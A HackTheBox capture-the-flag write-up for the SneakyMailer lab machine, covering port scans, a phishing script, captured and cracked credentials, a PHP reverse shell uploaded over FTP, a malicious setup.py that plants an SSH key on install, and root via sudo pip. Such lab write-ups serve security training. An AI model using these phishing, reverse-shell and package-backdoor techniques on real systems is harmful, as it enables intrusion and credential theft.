---
title: SneakyMailer Machine Writeup- HackTheBox
author: 4m0r
date: 2020-08-11 15:30:00 +0530
excerpt: A linux box from HackTheBox- gained foothold by a combination of email phishing and deploying PyPI package and 
         rooted through sudo permission. This is an active machine, so I highly recommend that you 
         try a bit harder before heading inside.
thumbnail: /assets/img/posts/sneakymailer/info.png
categories: [HackTheBox, Machine]
tags: [linux, phishing, mail, pypi, pip, python package]
---

![Info](/assets/img/posts/sneakymailer/info.png)

# Methodology
1. Open Ports Enumeration
2. Web Service Enumeration
3. Email list gathered from the website
4. Password collected from email phishing
5. Subdomain identified from FTP
6. Foothold gained by placing file through FTP
7. Elevated to *user* through pypi
8. Root shell gained through sudo permissions

# Lessons Learned
1. Email phishing
2. Pypi private package deployment
3. Privilege escalation through pip

# Open Ports Enumeration
The open ports enumeration of the target had identified seven open ports namely **FTP** (21), **SSH** (22), **SMTP** (25), 
**HTTP** (80), **IMAP** (143), **IMAPS** (993) and **HTTP-PROXY** (8080).
The scan had not identified any known vulnerabilities or useful information. The scan results are given on the section 
below.

```
[_4m0r@manjaro SneakyMailer]$ targetRecon 10.10.10.197 
[+] Open Ports Scan 
        21      ftp 
        22      ssh 
        25      smtp 
        80      http 
        143     imap 
        993     imaps 
        8080    http-proxy 
[+] Scripts Scan 
                 nmap -sV -A --script=default,vuln -p 21 10.10.10.197 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-09 17:48 IST 
Pre-scan script results: 
| broadcast-avahi-dos:  
|   Discovered hosts: 
|     224.0.0.251 
|   After NULL UDP avahi packet DoS (CVE-2011-1002). 
|_  Hosts are all up (not vulnerable). 
Nmap scan report for 10.10.10.197 (10.10.10.197) 
Host is up (0.28s latency). 
 
PORT   STATE SERVICE VERSION 
21/tcp open  ftp     vsftpd 3.0.3 
|_clamav-exec: ERROR: Script execution failed (use -d to debug) 
|_sslv2-drown:  
Service Info: OS: Unix 
 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 44.43 seconds 
 
                 nmap -sV -A --script=default,vuln -p 22 10.10.10.197 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-09 17:49 IST 
Pre-scan script results: 
| broadcast-avahi-dos:  
|   Discovered hosts: 
|     224.0.0.251 
|   After NULL UDP avahi packet DoS (CVE-2011-1002). 
|_  Hosts are all up (not vulnerable). 
Nmap scan report for 10.10.10.197 (10.10.10.197) 
Host is up (0.30s latency). 
 
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 
|_clamav-exec: ERROR: Script execution failed (use -d to debug)                                                                                                                   
| ssh-hostkey:                                                                                                                                                                    
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)                                                                                                                    
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)                                                                                                                   
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)                                                                                                                 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                           
                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 45.79 seconds                                                                                                                      
                                                                                                                                                                                  
                 nmap -sV -A --script=default,vuln -p 25 10.10.10.197 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-09 17:50 IST                                                                                                                   
Pre-scan script results:                                                                                                                                                          
| broadcast-avahi-dos:                                                                                                                                                            
|   Discovered hosts:                                                                                                                                                             
|     224.0.0.251                                                                                                                                                                 
|   After NULL UDP avahi packet DoS (CVE-2011-1002).                                                                                                                              
|_  Hosts are all up (not vulnerable).                                                                                                                                            
Nmap scan report for 10.10.10.197 (10.10.10.197)                                                                                                                                  
Host is up (0.36s latency).                                                                                                                                                       
                                                                                                                                                                                  
PORT   STATE SERVICE VERSION                                                                                                                                                      
25/tcp open  smtp    Postfix smtpd                                                                                                                                                
|_clamav-exec: ERROR: Script execution failed (use -d to debug)                                                                                                                   
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,                                                 
| smtp-vuln-cve2010-4344:                                                                                                                                                         
|_  The SMTP server is not Exim: NOT VULNERABLE                                                                                                                                   
|_sslv2-drown:                                                                                                                                                                    
Service Info: Host:  debian                                                                                                                                                       
                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 259.11 seconds                                                                                                                     
                                                                                                                                                                                  
                 nmap -sV -A --script=default,vuln -p 80 10.10.10.197 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-09 17:54 IST                                                                                                                   
Pre-scan script results:                                                                                                                                                          
| broadcast-avahi-dos:                                                                                                                                                            
|   Discovered hosts:                                                                                                                                                             
|     224.0.0.251                                                                                                                                                                 
|   After NULL UDP avahi packet DoS (CVE-2011-1002).                                                                                                                              
|_  Hosts are all up (not vulnerable).                                                                                                                                            
Nmap scan report for 10.10.10.197 (10.10.10.197)                                                                                                                                  
Host is up (0.36s latency).                                                                                                                                                       
                                                                                                                                                                                  
PORT   STATE SERVICE VERSION                                                                                                                                                      
80/tcp open  http    nginx 1.14.2                                                                                                                                                 
|_clamav-exec: ERROR: Script execution failed (use -d to debug)                                                                                                                   
|_http-csrf: Couldn't find any CSRF vulnerabilities.                                                                                                                              
|_http-dombased-xss: Couldn't find any DOM based XSS.                                                                                                                             
|_http-passwd: ERROR: Script execution failed (use -d to debug)                                                                                                                   
|_http-server-header: nginx/1.14.2                                                                                                                                                
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                                                                                                  
|_http-title: Did not follow redirect to http://sneakycorp.htb                                                                                                                    
                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 750.64 seconds                                                                                                                     
                                                                                                                                                                                  
                 nmap -sV -A --script=default,vuln -p 143 10.10.10.197 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-09 18:06 IST                                                                                                                   
Pre-scan script results:                                                                                                                                                          
| broadcast-avahi-dos:                                                                                                                                                            
|   Discovered hosts:                                                                                                                                                             
|     224.0.0.251                                                                                                                                                                 
|   After NULL UDP avahi packet DoS (CVE-2011-1002).                                                                                                                              
|_  Hosts are all up (not vulnerable).                                                                                                                                            
Nmap scan report for sneakycorp.htb (10.10.10.197)                                                                                                                                
Host is up (0.25s latency).                                                                                                                                                       
                                                                                                                                                                                  
PORT    STATE SERVICE VERSION                                                                                                                                                     
143/tcp open  imap    Courier Imapd (released 2018)                                                                                                                               
|_clamav-exec: ERROR: Script execution failed (use -d to debug)                                                                                                                   
|_imap-capabilities: CAPABILITY ENABLE THREAD=REFERENCES IMAP4rev1 THREAD=ORDEREDSUBJECT completed OK ACL ACL2=UNION QUOTA UTF8=ACCEPTA0001 IDLE NAMESPACE STARTTLS UIDPLUS CHILD
REN SORT                                                                                                                                                                          
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US                                                              
| Subject Alternative Name: email:postmaster@example.com                                                                                                                          
| Not valid before: 2020-05-14T17:14:21                                                                                                                                           
|_Not valid after:  2021-05-14T17:14:21                                                                                                                                           
|_ssl-date: TLS randomness does not represent time                                                                                                                                
|_sslv2-drown:                                                                                                                                                                    
                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 113.92 seconds                                                                                                                     
                                                                                                                                                                                  
                 nmap -sV -A --script=default,vuln -p 993 10.10.10.197 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-09 18:08 IST                                                                                                                   
Pre-scan script results:                                                                                                                                                          
| broadcast-avahi-dos:                                                                                                                                                            
|   Discovered hosts:                                                                                                                                                             
|     224.0.0.251                                                                                                                                                                 
|   After NULL UDP avahi packet DoS (CVE-2011-1002).                                                                                                                              
|_  Hosts are all up (not vulnerable).                                                                                                                                            
Nmap scan report for sneakycorp.htb (10.10.10.197)                                                                                                                                
Host is up (0.35s latency).                                                                                                                                                       
                                                                                                                                                                                  
PORT    STATE SERVICE  VERSION                                                                                                                                                    
993/tcp open  ssl/imap Courier Imapd (released 2018)                                                                                                                              
|_clamav-exec: ERROR: Script execution failed (use -d to debug)                                                                                                                   
|_imap-capabilities: completed CHILDREN ACL2=UNION ENABLE UIDPLUS ACL CAPABILITY SORT OK UTF8=ACCEPTA0001 THREAD=REFERENCES QUOTA AUTH=PLAIN NAMESPACE IDLE THREAD=ORDEREDSUBJECT
 IMAP4rev1                                                                                                                                                                        
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US                                                              
| Subject Alternative Name: email:postmaster@example.com                                                                                                                          
| Not valid before: 2020-05-14T17:14:21                                                                                                                                           
|_Not valid after:  2021-05-14T17:14:21                                                                                                                                           
|_ssl-date: TLS randomness does not represent time                                                                                                                                
|_sslv2-drown:                                                                                                                                                                    
                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 57.14 seconds                                                                                                                      
                                                                                                                                                                                  
                 nmap -sV -A --script=default,vuln -p 8080 10.10.10.197 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-09 18:09 IST                                                                                                                   
Pre-scan script results:                                                                                                                                                          
| broadcast-avahi-dos:                                                                                                                                                            
|   Discovered hosts:                                                                                                                                                             
|     224.0.0.251                                                                                                                                                                 
|   After NULL UDP avahi packet DoS (CVE-2011-1002).                                                                                                                              
|_  Hosts are all up (not vulnerable).                                                                                                                                            
Nmap scan report for sneakycorp.htb (10.10.10.197)                                                                                                                                
Host is up (0.30s latency).                                                                                                                                                       
                                                                                                                                                                                  
PORT     STATE SERVICE VERSION                                                                                                                                                    
8080/tcp open  http    nginx 1.14.2                                                                                                                                               
|_clamav-exec: ERROR: Script execution failed (use -d to debug)                                                                                                                   
|_http-csrf: Couldn't find any CSRF vulnerabilities.                                                                                                                              
|_http-dombased-xss: Couldn't find any DOM based XSS.                                                                                                                             
|_http-open-proxy: Proxy might be redirecting requests                                                                                                                            
|_http-server-header: nginx/1.14.2                                                                                                                                                
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                                                                                                  
|_http-title: Welcome to nginx!                                                                                                                                                   
| http-vuln-cve2011-3192:                                                                                                                                                         
|   VULNERABLE:                                                                                                                                                                   
|   Apache byterange filter DoS                                                                                                                                                   
|     State: VULNERABLE                                                                                                                                                           
|     IDs:  CVE:CVE-2011-3192  BID:49303                                                                                                                                          
|       The Apache web server is vulnerable to a denial of service attack when numerous                                                                                           
|       overlapping byte ranges are requested.                                                                                                                                    
|     Disclosure date: 2011-08-19                                                                                                                                                 
|     References:                                                                                                                                                                 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192                                                                                                              
|       https://www.tenable.com/plugins/nessus/55976                                                                                                                              
|       https://seclists.org/fulldisclosure/2011/Aug/175                                                                                                                          
|_      https://www.securityfocus.com/bid/49303                                                                                                                                   
                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 706.94 seconds                                                                                                                     
                                                                                                                                                                                  
[+] Summary  
21      ftp     vsftpd 3.0.3 
                No vuln found 
22      ssh     OpenSSH 7.9p1 Debian 10+deb10u2 
                No vuln found 
25      smtp    Postfix smtpd N/A 
                No vuln found 
80      http    nginx 1.14.2 
                No vuln found 
143     imap    Courier Imapd N/A 
                No vuln found 
993     imaps   Courier Imapd N/A 
                No vuln found 
8080    http-proxy      nginx 1.14.2 
                No vuln found
```

# Web Service Enumeration
Browsing to [http://10.10.10.197](http://10.10.10.197), had resulted in a redirection to 
[http://sneakycorp.htb/](http://sneakycorp.htb/). After mapping *sneakycorp.htb* to 10.10.10.197, browsing to 
[http://sneakycorp.htb/](http://sneakycorp.htb/), revealed the website of **SNEAKY CORP**. From 
**[Teams](http://sneakycorp.htb/team.php)**, a list of email IDs were enumerated and written to a file, *users.list*.

# Email Phishing
With a list of emails and an open SMTP port, a phishing attempt can be made. A python script that sends an email to 
every email ID in the list, with a link to the attacking host's webserver was written and the same is given below.

```python
import smtplib
from email.message import EmailMessage

sender = 'it@sneakycorp'  # Sender mail ID
receivers = [line.strip () for line in open ('users.list')]

msg = EmailMessage ()
msg ['Subject'] = 'New Mail Server'
msg ['From'] = sender
msg ['To'] = receivers
msg.set_content ('http://10.10.14.186:8080')  # Message content

try:
    mail = smtplib.SMTP ('10.10.10.197', 25)   # Target server and port num
    mail.send_message (msg)
    print ('Mail Sent')

except smtplib.SMTPException:
    print ('Error sending mail')

finally:
    mail.quit ()
```
A netcat listener on port 8080 was started and the script was executed. After a while, the user *Paul Byrd*, had 
visited the link and leaked their password in the process, through the web request. The content that hit 
the netcat listener, when Paul had visited is shown below.
```bash
[_4m0r@manjaro SneakyMailer]$ nc -nvlp 8080 
Connection from 10.10.10.197:60184 
POST / HTTP/1.1 
Host: 10.10.14.186:8080 
User-Agent: python-requests/2.23.0 
Accept-Encoding: gzip, deflate 
Accept: */* 
Connection: keep-alive 
Content-Length: 185 
Content-Type: application/x-www-form-urlencoded 
 
firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl
%3C%3AHt
```
The request body was decoded with an URL decoder[^f1] to the following.
```bash
firstName=Paul&lastName=Byrd&email=paulbyrd@sneakymailer.htb&password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht&rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```
```text
firstName = Paul
lastName = Byrd
email = paulbyrd@sneakymailer.htb
password = ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
rpassword = ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```
Now that the username and password of *Paul Byrd* has been identified, their emails can be read through commandline or 
through mail clients.
> I used **evolution**[^f2] for enumerating the emails

From the **Sent Items** folder, under *Inbox*, an email with the subject **Password Reset** was identified and the 
contents of the same is shown below.
![Mail](/assets/img/posts/sneakymailer/mail.png)

With this another set of credentials, **developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C** had been identified.

# User Shell
## Initial Foothold
The *developer* credentials were tried on *SSH* with no success and the same was attempted on *FTP*, resulting in a 
successful login. Enumerating the FTP revealed a webserver setup under the folder, **dev**. On a whim, the  entry
**dev.sneakycorp.htb** was mapped to 10.10.10.197 in /etc/hosts. Browsing to 
[dev.sneakycorp.htb](http://dev.sneakycorp.htb), confirmed
the presence of the subdomain. Further enumeration showed that the user has access to put files on FTP. 
<br>
Therefore, a **PHP Reverse shell** was placed on the webserver through FTP. (Note that the PHP was modified to send the 
reverse shell to port 9090). A netcat listener on port 9090 was started and the reverse shell was triggered by visiting 
the URL [http://dev.sneakycorp.htb/reverse.php](http://dev.sneakycorp.htb/reverse.php).
```bash
[---TERMINAL 1---]
[_4m0r@manjaro SneakyMailer]$ ftp 10.10.10.197 
Connected to 10.10.10.197. 
220 (vsFTPd 3.0.3) 
Name (10.10.10.197:_4m0r): developer 
331 Please specify the password. 
Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C  
230 Login successful. 
Remote system type is UNIX. 
Using binary mode to transfer files. 
ftp> cd dev 
250 Directory successfully changed. 
ftp> ls  
200 PORT command successful. Consider using PASV. 
150 Here comes the directory listing. 
drwxr-xr-x    2 0        0            4096 May 26 19:52 css 
drwxr-xr-x    2 0        0            4096 May 26 19:52 img 
-rwxr-xr-x    1 0        0           13742 Jun 23 09:44 index.php 
drwxr-xr-x    3 0        0            4096 May 26 19:52 js 
drwxr-xr-x    2 0        0            4096 May 26 19:52 pypi 
drwxr-xr-x    4 0        0            4096 May 26 19:52 scss 
-rwxr-xr-x    1 0        0           26523 May 26 20:58 team.php 
drwxr-xr-x    8 0        0            4096 May 26 19:52 vendor 
226 Directory send OK. 
ftp> put reverse.php
200 PORT command successful. Consider using PASV. 
150 Ok to send data. 
226 Transfer complete. 
5494 bytes sent in 0.000148 seconds (35.4 Mbytes/s)

[---TERMINAL 2---]
[_4m0r@manjaro SneakyMailer]$ nc -nvlp 9090 
Connection from 10.10.10.197:33272 
Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux 
 09:43:37 up  2:08,  0 users,  load average: 0.02, 0.01, 0.00 
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT 
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
/bin/sh: 0: can't access tty; job control turned off 
$ which python 
/usr/bin/python 
$ python -c "import pty;pty.spawn('/bin/bash');" 
www-data@sneakymailer:/$
```
 The reverse shell was from the user **www-data**, with no access to read the *user.txt* on */home/low*.
 
## Elevating to *low*
Enumerating with the shell revealed a **.htpasswd** file on */var/www/pypi.sneakycorp.htb* with the following content.
```text
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```
The hash was cracked using **john** and *rockyou.txt* into **soufianeelhaoui**.
```bash
[_4m0r@manjaro SneakyMailer]$ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt pypi.hash  
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long" 
Use the "--format=md5crypt-long" option to force loading these as that type instead 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-opencl" 
Use the "--format=md5crypt-opencl" option to force loading these as that type instead 
Using default input encoding: UTF-8 
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3]) 
Will run 4 OpenMP threads 
Press 'q' or Ctrl-C to abort, almost any other key for status 
soufianeelhaoui  (?) 
1g 0:00:00:32 DONE (2020-08-10 00:10) 0.03117g/s 111417p/s 111417c/s 111417C/s souhegan..souderton0 
Use the "--show" option to display all of the cracked passwords reliably 
Session completed
```
Switching to **pypi** using *su* had failed. The other mail on Paul Byrd's **Sent Items**, provided a vital vector for
escalating to *low*. The contents of the mail, with the subject line **Module testing**, is shown below.
![Module Testing](/assets/img/posts/sneakymailer/pypimail.png)

According to the mail, the user *low* will install and test every python module on the **PyPI** service. Google-Fu on
installing python packages, had led to **Packaging Python Projects**[^f3] and **pypiserver.1.3.2**[^f4]. According to 
the resources, it needs two files, **.pypirc** and **setup.py**.
<br>
*.pypirc* will authorize the packages and *setup.py* will setup the package.
<br>
The contents of both files are as shown below.
<br>
**.pypirc**
```markdown
[distutils]
index-servers = local

[local]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
```
**setup.py**
```python
from setuptools import setup

try:
    with open ('/home/low/.ssh/authorized_keys', 'a') as fl:
        fl.write ("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDID/Vuwqj/I6KCDeIK5XuIUgCjbD3zYSn0S5ExlhX/30Yw2Bep+h/R62293DxlIXVgHL9jRuQWVHXE4WW+UD9DVYFxFanC8bDYb0H0GFGTgq8s4fdwF+QRJXhsRWEM0y2E5HW769goRwhPpyIlRaxMTcDIq0nHxFWGmXoJ/BwL4E7VApdz/sMKziTH+iG2AvBJEzu9WjVMx+hSRc72h6a9kq7BvHATa0XEAzr4dZ7SnpZGPFPiCdzCza691ChnKJI97HuGAx9xTWx4EeSyFzkfJujH+u3OsaH0oi11ldcEJYwtuw+gJK3N50mk49Bi6P2hF7pKEWKFZqYxb05FLfYNs1hrXCb7wfzIkXzZXFvivlMuJrMgiaBw+Cgc1Lvqb1nFdQ4O8khEoBu5ugBVJ47Qok/JoQZaHF8awgOA4oNGWygNZBtzO31ZrdxYRifvSaD5M4WwEk59Hs51iXa/JDxURIaPUPGH3LMo0FSFp98Ql/eWG7D04nCkmt7fFLHEGhs= _4m0r@manjaro")

    with open ('/root/.ssh/authorized_keys', 'a') as fl:
        fl.write ("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDID/Vuwqj/I6KCDeIK5XuIUgCjbD3zYSn0S5ExlhX/30Yw2Bep+h/R62293DxlIXVgHL9jRuQWVHXE4WW+UD9DVYFxFanC8bDYb0H0GFGTgq8s4fdwF+QRJXhsRWEM0y2E5HW769goRwhPpyIlRaxMTcDIq0nHxFWGmXoJ/BwL4E7VApdz/sMKziTH+iG2AvBJEzu9WjVMx+hSRc72h6a9kq7BvHATa0XEAzr4dZ7SnpZGPFPiCdzCza691ChnKJI97HuGAx9xTWx4EeSyFzkfJujH+u3OsaH0oi11ldcEJYwtuw+gJK3N50mk49Bi6P2hF7pKEWKFZqYxb05FLfYNs1hrXCb7wfzIkXzZXFvivlMuJrMgiaBw+Cgc1Lvqb1nFdQ4O8khEoBu5ugBVJ47Qok/JoQZaHF8awgOA4oNGWygNZBtzO31ZrdxYRifvSaD5M4WwEk59Hs51iXa/JDxURIaPUPGH3LMo0FSFp98Ql/eWG7D04nCkmt7fFLHEGhs= _4m0r@manjaro")

except:
    setup(
    name='shell',
    packages=['shell'],
    description='Hello world enterprise edition',
    version='0.1',
    url='http://sneakycorp.htb',
    author='4m0r',
    author_email='4m0r@htb',
    keywords=['pip','escalate','shell']
    )
```
As noted earlier, *.pypirc* will authorize *pypi* and *setup.py* will attempt to write the public key into
*/home/low/.ssh/authorized_keys* and */root/.ssh/authorized_keys*. Although, it's unlikely that the public key will be
written to authorized_keys of the root user, it will definitely be written onto authorized_keys of the user *low*.
> Any python command that is written into setup.py gets executed as *low* and so it can also be used to send a python
>reverse shell, instead of appending *authorized_keys*. I went with the *SSH* option as that results in a stable
>access to the target.

These files were downloaded onto the target and the setup.py was given executable permission. 
The package can then be installed with the command `python3 setup.py sdist register -r local upload -r local`. 
```bash
www-data@sneakymailer:~$ python3 setup.py sdist register -r local upload -r local 
python3 setup.py sdist register -r local upload -r local 
running sdist 
running egg_info 
creating shell.egg-info 
---SNIP---
creating dist 
Creating tar archive 
removing 'shell-0.1' (and everything under it) 
running register 
Registering shell to http://pypi.sneakycorp.htb:8080 
Server response (200): OK 
WARNING: Registering is deprecated, use twine to upload instead (https://pypi.org/p/twine/) 
running upload 
Submitting dist/shell-0.1.tar.gz to http://pypi.sneakycorp.htb:8080 
Server response (200): OK 
WARNING: Uploading via this command is deprecated, use twine to upload instead (https://pypi.org/p/twine/)
```
Upon installing the package, the public key gets appended to the authorized_keys. With the private key, an SSH 
connection to the target as the user **low** was then initiated, through which the user flag was read.
```
[_4m0r@manjaro SneakyMailer]$ chmod 600 id_rsa 
[_4m0r@manjaro SneakyMailer]$ ssh -i id_rsa low@sneakycorp.htb 
The authenticity of host 'sneakycorp.htb (10.10.10.197)' can't be established. 
ECDSA key fingerprint is SHA256:I1lCFRteozDGkqC/ZSE2SbHl8ISpJWhfu5nwn6LxbA0. 
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added 'sneakycorp.htb' (ECDSA) to the list of known hosts. 
Linux sneakymailer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 
 
The programs included with the Debian GNU/Linux system are free software; 
the exact distribution terms for each program are described in the 
individual files in /usr/share/doc/*/copyright. 
 
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent 
permitted by applicable law. 
No mail. 
Last login: Tue Jun  9 03:02:52 2020 from 192.168.56.105 
low@sneakymailer:~$ cat user.txt  
67b2c---REDACTED---eadbf
```
![User Shell](/assets/img/posts/sneakymailer/user.png)

# Root Shell
With the user shell, enumerating the **sudo** permissions revealed that the user has *no password* sudo access to run 
the binary **/usr/bin/pip3**. 
```bash
low@sneakymailer:~$ sudo -l 
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution 
Matching Defaults entries for low on sneakymailer: 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin 
 
User low may run the following commands on sneakymailer: 
    (root) NOPASSWD: /usr/bin/pip3 
``` 
Google-Fu had led to **pip- GTFOBins**[^f5] and according to it, privilege can be escalated to root by executing the
following commands.
```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```
> **It runs in privileged context and may be used to access
the file system, escalate or maintain access with elevated privileges if enabled on sudo.[^f5]** 

Using the same, root shell was gained and the root flag was then read as shown below.
```bash
low@sneakymailer:~$ TF=$(mktemp -d) 
low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py 
low@sneakymailer:~$ sudo /usr/bin/pip3 install $TF 
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution 
Processing /tmp/tmp.Z8HX9IC9zP 
# id 
uid=0(root) gid=0(root) groups=0(root) 
# cat /root/root.txt     
83c44---REDACTED---62b8b
```
![Root Shell](/assets/img/posts/sneakymailer/root.png)

# Footnotes
[^f1]:[URL Decoder/Encoder](https://meyerweb.com/eric/tools/dencoder/) 
[^f2]:[Evolution Mail Client](https://wiki.gnome.org/Apps/Evolution)
[^f3]:[Packaging Python Projects](https://packaging.python.org/tutorials/packaging-projects/)
[^f4]:[pypiserver 1.3.2](https://pypi.org/project/pypiserver/#upload-with-setuptools)
[^f5]:[pip- GTFOBins](https://gtfobins.github.io/gtfobins/pip/)